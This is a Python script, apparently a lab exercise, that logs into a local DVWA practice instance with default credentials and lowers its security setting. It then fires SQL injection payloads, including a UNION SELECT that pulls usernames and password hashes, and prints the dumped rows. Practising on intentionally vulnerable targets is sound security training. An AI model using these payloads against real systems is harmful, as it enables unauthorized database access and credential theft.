
import requests
import re

s = requests.Session()

# Step 1: Get login page and extract CSRF token
r = s.get("http://localhost:28080/login.php")
token_match = re.search(r"user_token['\s]*value=['\"]([^'\"]+)", r.text)
token = token_match.group(1)
print(f"[+] CSRF Token: {token}")

# Step 2: Login
r = s.post("http://localhost:28080/login.php", data={
    "username": "admin",
    "password": "password",
    "Login": "Login",
    "user_token": token
}, allow_redirects=True)
print(f"[+] Login: {r.url} (status {r.status_code})")

# Step 3: Fix cookies - clear any existing 'security' cookie, then set low
try:
    del s.cookies['security']
except:
    pass
# Also clear from the jar more thoroughly
s.cookies.clear('localhost', '/', 'security')
s.cookies.set("security", "low", domain="localhost", path="/")
print(f"[+] All cookies: {[(c.name, c.value) for c in s.cookies]}")

# Step 4: Verify SQLi page loads
r = s.get("http://localhost:28080/vulnerabilities/sqli/")
has_form = "Submit" in r.text or "Input an ID" in r.text
print(f"[+] SQLi page loaded: {r.status_code}, has form: {has_form}")

# Step 5: UNION SQLi - DVWA sqli returns 2 columns: first_name, last_name
payloads = [
    ("Basic dump", "' OR 1=1 -- "),
    ("UNION creds", "' UNION SELECT user,password FROM users -- "),
    ("UNION creds hash", "' UNION SELECT user,password FROM users#"),
]

for name, payload in payloads:
    r = s.get("http://localhost:28080/vulnerabilities/sqli/", params={
        "id": payload,
        "Submit": "Submit"
    })
    results = re.findall(r'<td[^>]*>(.*?)</td>', r.text, re.DOTALL)
    errors = re.findall(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    
    if results:
        print(f"\n{'='*50}")
        print(f"[+] {name}: SQLi SUCCESS - {len(results)} cells found")
        print(f"{'='*50}")
        for i, res in enumerate(results):
            print(f"    [{i}] {res.strip()[:80]}")
        if len(results) >= 2:
            print(f"\n[!] DATA EXFILTRATED: Found {len(results)} records from database!")
    elif errors:
        print(f"\n[-] {name}: ERROR - {errors[0][:120]}")
    else:
        print(f"\n[-] {name}: No output")

